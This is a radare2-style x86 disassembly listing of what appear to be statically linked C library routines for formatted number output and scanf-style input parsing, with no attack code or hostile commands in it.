mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806f0ad
inc edi
cmp ebx, dword [var_14h]
jb 0x806efd0
lea esi, [esi]
mov eax, dword [var_10h]
mov edx, dword [eax]
cmp edx, 0xffffffff
je 0x806f07c
mov eax, dword [var_8h]
mov ecx, dword [eax + 0x58]
mov eax, dword [ecx + 0x10]
cmp eax, dword [ecx + 0x14]
jae 0x806f0d8
mov dword [eax], 0x2e
add eax, 4
mov dword [ecx + 0x10], eax
inc edi
mov ecx, edx
mov ebx, dword [var_14h]
mov esi, 0xcccccccd
mov eax, ecx
sub ebx, 4
mul esi
shr edx, 3
lea eax, [edx + edx*4]
add eax, eax
sub ecx, eax
test edx, edx
mov eax, dword [ecx*4 + str.0123456789abcdefghijklmnopqrstuvwxyz]
mov ecx, edx
mov dword [ebx], eax
jne 0x806f033
cmp ebx, dword [var_14h]
jae 0x806f07c
mov eax, dword [var_8h]
mov ecx, dword [ebx]
add ebx, 4
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f0c6
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806f0ad
inc edi
cmp ebx, dword [var_14h]
jb 0x806f058
mov eax, dword [var_10h]
mov ecx, dword [eax + 8]
test ecx, ecx
je 0x806f0a0
mov eax, dword [var_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f0b4
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806f0ad
inc edi
mov eax, edi
mov esp, dword [var_10h_2]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov edi, 0xffffffff
jmp 0x806f0a0
mov dword [var_4h], ecx
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806f09d
mov dword [var_4h], ecx
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806f074
mov dword [var_4h], 0x2e
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
je 0x806f0ad
mov eax, dword [var_10h]
mov edx, dword [eax]
jmp 0x806f028
mov dword [var_4h], ecx
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806eff0
mov dword [var_4h], 0x49
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jne 0x806ef92
jmp 0x806f0ad
mov eax, dword [var_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f149
mov dword [eax], 0x30
add eax, 4
mov dword [edx + 0x10], eax
inc edi
jmp 0x806ef6b
mov dword [var_4h], 0x30
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jne 0x806f143
jmp 0x806f0ad
mov dword [var_4h], 0x2d
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jne 0x806ef5d
jmp 0x806f0ad
mov dword [var_4h], 0x2b
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jne 0x806ef33
jmp 0x806f0ad
test al, 0x10
je 0x806ef3b
mov eax, dword [var_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f1c3
mov dword [eax], 0x20
jmp 0x806ef2d
mov dword [var_4h], 0x20
jmp 0x806f18b
mov dword [var_4h], 0x27
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jne 0x806ef05
jmp 0x806f0ad
mov dword [var_4h], 0x23
mov edi, 0xffffffff
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jne 0x806eed7
jmp 0x806f0a0
mov dword [var_4h], 0x25
mov edi, 0xffffffff
mov edx, dword [var_8h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jne 0x806eea9
jmp 0x806f0a0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, eax
sub esp, 0x14
mov dword [var_14h], ecx
mov dword [var_10h], edx
movzx eax, byte [ecx]
cmp al, 0x7f
je 0x806f2c4
test al, al
jle 0x806f2c4
sub edx, ebx
movsx esi, al
inc dword [var_14h]
lea eax, [edx + 0x12]
and eax, 0xfffffffc
sub esp, eax
lea edi, [var_1bh]
mov dword [var_8h], edx
mov dword [var_4h], ebx
and edi, 0xfffffff0
mov dword [esp], edi
call fcn.08053740
mov ebx, dword [var_10h]
cmp eax, edi
mov edx, eax
jbe 0x806f2c4
lea esi, [esi]
sub edx, 4
sub ebx, 4
dec esi
mov eax, dword [edx]
mov dword [ebx], eax
jne 0x806f2c0
cmp edx, edi
jbe 0x806f2c4
mov eax, dword [arg_8h]
mov ecx, dword [var_14h]
sub ebx, 4
mov dword [ebx], eax
movzx eax, byte [ecx]
cmp al, 0x7f
je 0x806f2d9
test al, al
jl 0x806f2d9
je 0x806f2d0
inc dword [var_14h]
movsx esi, al
nop
cmp edx, edi
ja 0x806f290
lea esp, [var_ch]
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret 4
mov eax, dword [var_14h]
movsx esi, byte [eax - 1]
jmp 0x806f2c0
sub edx, 4
sub ebx, 4
mov eax, dword [edx]
cmp edx, edi
mov dword [ebx], eax
ja 0x806f2d9
jmp 0x806f2c4
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [arg_8h]
mov ebx, dword [arg_ch]
mov ecx, dword [esi + 0x58]
mov edi, dword [esi + 0x154]
mov eax, dword [ecx + 0x10]
sub eax, dword [ecx + 0xc]
sar eax, 2
jne 0x806f344
mov eax, dword [ecx + 0x10]
cmp eax, dword [ecx + 0x14]
jae 0x806f336
mov dword [eax], ebx
add eax, 4
mov dword [ecx + 0x10], eax
mov eax, ebx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov dword [var_sp_4h], ebx
mov dword [esp], esi
call fcn.08075d10
jmp 0x806f32b
mov edx, dword [edi + 0x94]
mov dword [var_sp_8h], eax
mov eax, dword [ecx + 0xc]
mov dword [esp], edi
mov dword [var_sp_4h], eax
call dword [edx + 0x1c]
mov ecx, dword [esi + 0x58]
shl eax, 2
sub dword [ecx + 0x10], eax
jmp 0x806f319
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
mov edi, edx
push esi
mov esi, eax
push ebx
mov ebx, ecx
sub esp, 0x8190
mov dword [var_4h], 1
mov dword [esp], eax
call fcn.08076600
dec eax
mov edx, 0xffffffff
jne 0x806f472
lea eax, [ebp - 0x80e4]
mov dword [var_4h], edi
mov dword [ebp - 0x8028], esi
mov dword [ebp - 0x8124], eax
mov dword [ebp - 0x8120], 1
mov dword [ebp - 0x817c], 0xfbad8004
lea eax, [ebp - 0x800c]
mov dword [ebp - 0x8134], 0
mov dword [ebp - 0x80e8], 0x80a1580
mov dword [ebp - 0x80d4], eax
mov dword [ebp - 0x80d8], eax
mov dword [var_8h], ebx
lea eax, [var_ch]
mov dword [ebp - 0x80d0], eax
lea eax, [ebp - 0x817c]
mov dword [esp], eax
call fcn.0806b9c0
mov edi, eax
mov eax, 0
test eax, eax
setne al
movzx eax, al
test eax, eax
mov dword [ebp - 0x8190], eax
jne 0x806f4ac
cmp word [esi], 0
jns 0x806f4a2
mov eax, dword [ebp - 0x8124]
mov ebx, dword [eax + 0x10]
sub ebx, dword [eax + 0xc]
sar ebx, 2
test ebx, ebx
jle 0x806f460
mov dword [var_8h], ebx
mov edx, dword [esi + 0x94]
mov eax, dword [eax + 0xc]
mov dword [esp], esi
mov dword [var_4h], eax
call dword [edx + 0x1c]
cmp eax, ebx
mov eax, 0xffffffff
cmovne edi, eax
cmp word [esi], 0
jns 0x806f498
mov edx, dword [ebp - 0x8190]
test edx, edx
jne 0x806f480
mov edx, edi
add esp, 0x8190
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
nop
lea eax, [ebp - 0x818c]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x806f470
mov dword [esp], esi
call fcn.08074580
jmp 0x806f466
mov dword [esp], esi
call fcn.08074540
jmp 0x806f42c
lea eax, [ebp - 0x818c]
mov dword [var_8h], esi
mov dword [var_4h], fcn.08074580
mov dword [esp], eax
call section.
jmp 0x806f426
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10c
test eax, eax
mov dword [var_a8h], 0
mov ebx, dword [arg_ch]
mov dword [var_94h], 0
mov dword [var_98h], 0
mov dword [var_9ch], 0
mov dword [var_90h], ebx
je 0x80744b0
mov dword [esp], 3
call section.
mov dword [var_ach_2], eax
mov ecx, dword [var_ach]
mov eax, dword [var_sp_ch]
mov dword [var_b4h], 0
mov dword [var_d4h], 0
mov dword [var_d8h], 0
mov dword [var_dch], 0
mov dword [var_e0h], 0
mov dword [var_e4h], 0
mov dword [var_ech], 0
mov ecx, dword [ecx]
mov dword [var_f0h], 0
mov dword [var_8ch], eax
mov dword [var_b0h], ecx
mov ecx, dword [var_4h]
mov edx, dword [ecx + 0x5c]
test edx, edx
jne 0x806f5d9
mov dword [ecx + 0x5c], 0xffffffff
mov edx, 0xffffffff
inc edx
mov eax, 0xffffffff
jne 0x806f74c
mov eax, dword [arg_8h]
test byte [eax], 4
jne 0x80744a3
test ebx, ebx
je 0x807448e
mov edx, dword [var_ach]
mov eax, dword [edx + 4]
mov edx, dword [var_e4h]
mov ecx, dword [eax + 0x24]
mov dword [var_c4h], ecx
mov eax, dword [eax + 0x28]
cmp byte [eax], 0
cmovne edx, eax
mov eax, 0
test eax, eax
mov dword [var_c8h], edx
setne al
movzx eax, al
test eax, eax
mov dword [var_f8h], eax
jne 0x807446f
mov eax, dword [arg_8h]
cmp word [eax], 0
jns 0x8074462
mov dword [var_64h], 0
mov dword [var_60h], 0
movzx eax, byte [ebx]
test al, al
je 0x806f721
mov ebx, eax
test bl, 0x80
jne 0x8074374
inc dword [var_90h]
cmp bl, 0x25
je 0x806f95d
mov ecx, dword [var_ach_2]
movzx edx, bl
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 0x20
je 0x806f7af
mov dword [var_e4h_2], 1
mov edx, dword [var_90h]
movzx eax, byte [edx]
test al, al
mov ebx, eax
jne 0x806f663
mov ecx, dword [var_e4h]
test ecx, ecx
je 0x806f721
cmp dword [var_9ch], 0xffffffff
je 0x806f798
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x806f785
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x806f773
mov edx, dword [var_9ch]
mov ecx, dword [var_ach]
mov dword [var_9ch], edx
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 0x20
jne 0x806f6b5
cmp edx, 0xffffffff
je 0x806f721
movzx eax, dl
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804e190
mov ecx, dword [arg_8h]
cmp word [ecx], 0
jns 0x806f769
mov edx, dword [var_f8h]
test edx, edx
jne 0x806f754
mov eax, dword [arg_14h]
test eax, eax
je 0x806f746
mov eax, dword [arg_14h]
mov edx, dword [var_a8h]
or dword [eax], edx
mov eax, dword [var_94h]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
lea eax, [var_1ch]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x806f734
mov dword [esp], ecx
call fcn.08074580
jmp 0x806f72a
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x806f6ee
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x806f6e1
call fcn.08048b20
mov edx, 0xffffffff
mov ecx, dword [var_b4h]
mov dword [eax], ecx
jmp 0x806f6f4
cmp dword [var_9ch_2], 0xffffffff
je 0x806f946
mov ecx, dword [var_4h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x806f933
movzx edx, byte [eax]
mov ecx, dword [var_4h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch_2], edx
cmp dword [var_9ch_2], 0xffffffff
je 0x806f921
inc dword [var_98h_2]
mov eax, dword [var_9ch_2]
mov dword [var_9ch_2], eax
inc eax
je 0x806f8c6
mov eax, dword [var_e4h_2]
test eax, eax
je 0x806f889
mov edx, dword [var_ach_2]
mov ecx, dword [var_9ch_2]
mov eax, dword [edx + 0x34]
test byte [eax + ecx*2 + 1], 0x20
je 0x806f87f
cmp dword [var_9ch_2], 0xffffffff
je 0x806f912
mov ecx, dword [var_4h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x806f8ff
movzx edx, byte [eax]
mov ecx, dword [var_4h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch_2], edx
cmp dword [var_9ch_2], 0xffffffff
je 0x806f8ed
inc dword [var_98h_2]
cmp dword [var_9ch_2], 0xffffffff
je 0x806f8c6
mov edx, dword [var_ach_2]
mov ecx, dword [var_9ch_2]
mov eax, dword [edx + 0x34]
test byte [eax + ecx*2 + 1], 0x20
jne 0x806f821
mov dword [var_e4h_2], 0
movzx eax, bl
cmp dword [var_9ch_2], eax
je 0x806f69c
cmp dword [var_9ch], 0xffffffff
je case.0x806fb57.38
movzx eax, byte [var_9ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804e190
mov dword [var_a8h], 2
jmp 0x806f721
mov esi, dword [var_94h]
mov dword [var_a8h], 1
test esi, esi
jne 0x806f721
mov dword [var_94h], 0xffffffff
jmp 0x806f721
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x806f860
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x806f84d
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x806f8c6
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x806f7ee
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x806f7db
call fcn.08048b20
mov edx, dword [var_b4h_2]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x806f7f4
mov edx, dword [var_90h]
mov dword [var_a4h], 0
mov dword [var_e8h], 0
mov dword [var_fch], 0
mov dword [var_f4h], 0
movzx ebx, byte [edx]
movzx eax, bl
sub eax, 0x30
cmp eax, 9
ja 0x80742a0
inc edx
mov dword [var_fch_2], eax
mov dword [var_90h_2], edx
movzx ebx, byte [edx]
movzx eax, bl
mov ecx, ebx
sub eax, 0x30
cmp eax, 9
ja 0x806f9f2
lea esi, [esi]
mov eax, dword [var_fch_2]
inc dword [var_90h_2]
lea edx, [eax + eax*4]
movzx eax, cl
lea edx, [eax + edx*2 - 0x30]
mov dword [var_fch_2], edx
mov edx, dword [var_90h_2]
movzx ebx, byte [edx]
movzx eax, bl
mov ecx, ebx
sub eax, 0x30
cmp eax, 9
jbe 0x806f9c0
cmp bl, 0x24
je 0x8074291
mov eax, dword [var_fch_2]
mov dword [var_a4h_2], 0x40
mov dword [var_fch_2], 0
mov dword [var_a0h_2], eax
mov eax, dword [var_a0h_2]
test eax, eax
jne 0x806fa2f
mov dword [var_a0h], 0xffffffff
movsx eax, bl
inc dword [var_90h]
sub eax, 0x4c
cmp eax, 0x2e
ja case.0x806fa44.77
jmp dword [eax*4 + str.iB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_b]
mov edx, dword [var_90h_2]
movzx ebx, byte [edx]
cmp bl, 0x68
je 0x80741e7
or dword [var_a4h_2], 4
test bl, bl
je case.0x806fb57.38
mov eax, dword [var_e4h]
inc dword [var_90h]
test eax, eax
jne 0x806faa0
cmp bl, 0x5b
je 0x806fb48
cmp bl, 0x63
je 0x806fb48
cmp bl, 0x43
je 0x806fb48
cmp bl, 0x6e
je 0x806fb48
call fcn.08048b20
mov esi, dword [eax]
mov dword [eax], 0
lea esi, [esi]
cmp dword [var_9ch], 0xffffffff
je 0x80741d8
mov edx, dword [var_4h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x80741c5
movzx ecx, byte [eax]
mov edx, dword [var_4h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch_2], ecx
cmp dword [var_9ch_2], 0xffffffff
je 0x80741b3
inc dword [var_98h_2]
cmp dword [var_9ch_2], 0xffffffff
je 0x80741a0
mov ecx, dword [var_ach]
mov edx, dword [var_9ch]
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 0x20
jne 0x806fab0
call fcn.08048b20
cmp dword [var_9ch], 0xffffffff
mov dword [eax], esi
je 0x806fb3e
movzx eax, byte [var_9ch_2]
mov ecx, dword [var_4h]
dec dword [var_98h_2]
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.0804e190
mov dword [var_e4h], 0
movzx eax, bl
sub eax, 0x25
cmp eax, 0x53
ja case.0x806fb57.38
jmp dword [eax*4 + 0x80a17ac]
cmp dword [var_9ch], 0xffffffff
je 0x806fbd7
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x806fbc7
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x806fbb8
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
inc eax
je 0x806f8c6
movzx eax, bl
cmp dword [var_9ch], eax
je 0x806f69c
jmp 0x806f8a1
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x806fb91
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x806fb82
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x806fb97
test byte [var_a4h], 8
jne 0x806fc25
mov eax, dword [var_fch]
test eax, eax
jne 0x806fe27
mov eax, dword [var_8ch]
add dword [var_8ch], 4
mov eax, dword [eax]
mov dword [var_d8h], eax
mov eax, dword [var_d8h]
test eax, eax
je case.0x806fb57.38
cmp dword [var_9ch], 0xffffffff
je 0x806fe10
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x806fdfd
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x806fdeb
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
inc eax
je 0x806f8c6
mov dword [var_6ch], 0
lea ebx, [var_6ch]
mov dword [var_68h], 0
lea esi, [var_6dh]
movzx eax, byte [var_9ch]
mov byte [var_6dh], al
mov dword [var_sp_ch], ebx
test byte [var_a4h], 8
mov dword [var_8h], 1
mov dword [var_4h], esi
mov eax, dword [var_d8h]
je 0x806fcb6
xor eax, eax
mov dword [esp], eax
call fcn.08077900
cmp eax, 0xfffffffe
jne 0x806fd4b
cmp dword [var_9ch], 0xffffffff
je 0x806fd3c
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x806fd2c
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x806fd1d
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
jne 0x806fc8b
mov dword [var_a8h], 4
call fcn.08048b20
mov dword [eax], 0x54
jmp 0x806f721
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x806fcfa
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x806fceb
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x806fd03
dec eax
jne 0x806fd03
dec dword [var_a0h]
add dword [var_d8h], 4
mov eax, dword [var_a0h]
test eax, eax
jle 0x806fda5
cmp dword [var_9ch], 0xffffffff
je 0x806fddc
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x806fdcc
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x806fdbd
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
jne 0x806fc8b
test byte [var_a4h], 8
jne 0x806f69c
inc dword [var_94h]
jmp 0x806f69c
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x806fd98
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x806fd89
call fcn.08048b20
mov ecx, dword [var_b4h]
mov dword [eax], ecx
jmp 0x806fda5
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x806fc64
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x806fc51
call fcn.08048b20
mov ecx, dword [var_b4h]
mov dword [eax], ecx
mov eax, 0xffffffff
jmp 0x806fc6a
mov edx, dword [var_fch]
mov eax, dword [arg_10h]
dec edx
je 0x806fc0f
add eax, 4
dec edx
jne 0x806fe37
jmp 0x806fc0f
test byte [var_a4h], 8
jne 0x806febe
test dword [var_a4h], 0x100
je 0x8070257
mov ecx, dword [var_fch]
test ecx, ecx
jne 0x807023c
mov eax, dword [var_8ch]
add dword [var_8ch], 4
mov eax, dword [eax]
mov dword [var_dch], eax
mov edx, dword [var_dch]
test edx, edx
je case.0x806fb57.38
mov dword [var_e0h], 0x64
mov dword [esp], 0x190
call fcn.08050fe0
mov edx, dword [var_dch]
mov dword [edx], eax
mov dword [var_d8h], eax
mov eax, dword [var_d8h]
test eax, eax
je case.0x806fb57.38
cmp dword [var_9ch], 0xffffffff
je 0x8070225
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8070212
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x8070200
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
inc eax
je 0x806f8c6
mov dword [var_78h], 0
lea esi, [var_78h]
mov dword [var_74h], 0
mov ecx, dword [var_ach]
mov edx, dword [var_9ch]
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 0x20
jne 0x80701df
mov byte [var_79h], dl
lea ebx, [var_79h]
test byte [var_a4h], 8
mov dword [var_sp_ch], esi
mov dword [var_8h], 1
mov dword [var_4h], ebx
mov eax, dword [var_d8h]
je 0x806ff62
xor eax, eax
mov dword [esp], eax
call fcn.08077900
cmp eax, 0xfffffffe
jne 0x806ffec
cmp dword [var_9ch], 0xffffffff
je 0x806ffda
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x806ffca
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x806ffbb
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
je 0x806fd03
movzx ecx, byte [var_9ch]
mov byte [var_79h], cl
jmp 0x806ff41
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x806ffa2
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x806ff93
call fcn.08048b20
mov ecx, dword [var_b4h]
mov dword [eax], ecx
jmp 0x806fd03
dec eax
jne 0x806fd03
add dword [var_d8h], 4
mov eax, dword [var_a4h]
and eax, 0x108
cmp eax, 0x100
je 0x8070123
mov eax, dword [var_a0h]
test eax, eax
jle 0x807002a
dec dword [var_a0h]
mov eax, dword [var_a0h]
test eax, eax
jle 0x8070076
cmp dword [var_9ch], 0xffffffff
je 0x8070111
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x80700fe
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x80700ec
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
jne 0x806ff21
test byte [var_a4h], 8
jne 0x806f69c
mov ecx, dword [var_d8h]
mov dword [ecx], 0
add ecx, 4
test dword [var_a4h], 0x100
mov dword [var_d8h], ecx
je 0x806fdb2
mov eax, dword [var_dch]
mov edx, ecx
sub edx, dword [eax]
mov eax, edx
sar eax, 2
cmp eax, dword [var_e0h]
je 0x806fdb2
mov dword [var_4h], edx
mov edx, dword [var_dch]
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
je 0x806fdb2
mov ecx, dword [var_dch]
mov dword [ecx], eax
jmp 0x806fdb2
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8070069
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8070056
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x8070076
mov edx, dword [var_dch]
mov ebx, dword [var_e0h]
mov eax, dword [edx]
shl ebx, 2
add eax, ebx
cmp dword [var_d8h], eax
jne 0x8070010
mov eax, dword [var_e0h]
shl eax, 3
mov dword [var_4h], eax
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov dword [var_d8h], eax
je 0x8070184
mov eax, dword [var_d8h]
mov ecx, dword [var_dch]
shl dword [var_e0h], 1
mov dword [ecx], eax
add eax, ebx
mov dword [var_d8h], eax
jmp 0x8070010
mov ecx, dword [var_dch]
lea eax, [ebx + 4]
mov dword [var_4h], eax
mov eax, dword [ecx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov dword [var_d8h], eax
je 0x80701be
add dword [var_d8h], ebx
inc dword [var_e0h]
mov edx, dword [var_dch]
mov dword [edx], eax
jmp 0x8070010
mov ecx, dword [var_dch]
mov edx, dword [var_e0h]
mov eax, dword [ecx]
mov dword [eax + edx*4 - 4], 0
inc dword [var_94h]
jmp case.0x806fb57.38
movzx eax, byte [var_9ch]
mov ecx, dword [arg_8h]
dec dword [var_98h]
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.0804e190
jmp 0x8070076
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x806fefd
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x806feea
call fcn.08048b20
mov ecx, dword [var_b4h]
mov dword [eax], ecx
mov eax, 0xffffffff
jmp 0x806ff03
mov edx, dword [var_fch]
mov eax, dword [arg_10h]
dec edx
je 0x806fe76
add eax, 4
dec edx
jne 0x807024c
jmp 0x806fe76
mov eax, dword [var_fch]
test eax, eax
jne 0x8070275
mov eax, dword [var_8ch]
add dword [var_8ch], 4
mov eax, dword [eax]
jmp 0x806feaa
mov edx, dword [var_fch]
mov eax, dword [arg_10h]
dec edx
je 0x807026e
add eax, 4
dec edx
jne 0x8070281
jmp 0x807026e
test byte [var_a4h], 1
je 0x8070a2f
test byte [var_a4h_2], 8
jne 0x8070312
test dword [var_a4h_2], 0x100
je 0x80709fd
mov esi, dword [var_fch_2]
test esi, esi
jne 0x80709e2
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
mov dword [var_dch_2], eax
mov ebx, dword [var_dch_2]
test ebx, ebx
je case.0x806fb57.38
mov dword [var_e0h_2], 0x64
mov dword [esp], 0x190
call fcn.08050fe0
mov ecx, dword [var_dch_2]
mov dword [ecx], eax
mov dword [var_d8h_2], eax
mov edx, dword [var_d8h_2]
test edx, edx
je case.0x806fb57.38
mov ecx, dword [var_90h]
cmp byte [ecx], 0x5e
je 0x80709cf
mov byte [var_b8h_2], 0
mov eax, dword [var_a0h]
test eax, eax
mov eax, 0x7fffffff
cmovns eax, dword [var_a0h]
cmp dword [var_f0h], 0xff
mov dword [var_a0h], eax
ja 0x807036b
sub esp, 0x110
mov dword [var_f0h_2], 0x100
lea eax, [var_1fh_4]
and eax, 0xfffffff0
mov dword [var_ech_2], eax
mov edx, dword [var_ech]
mov dword [var_8h], 0x100
mov dword [var_4h], 0
mov dword [esp], edx
call fcn.080536f0
mov ecx, dword [var_90h]
movzx ebx, byte [ecx]
cmp bl, 0x5d
je 0x80709ae
cmp bl, 0x2d
je 0x80709ae
inc dword [var_90h]
mov edx, ebx
test bl, bl
je case.0x806fb57.38
cmp bl, 0x5d
je 0x80703ed
cmp bl, 0x2d
je 0x8070960
movzx eax, dl
mov edx, dword [var_ech_2]
mov byte [eax + edx], 1
mov ecx, dword [var_90h_2]
movzx ebx, byte [ecx]
inc dword [var_90h_2]
mov edx, ebx
test bl, bl
je case.0x806fb57.38
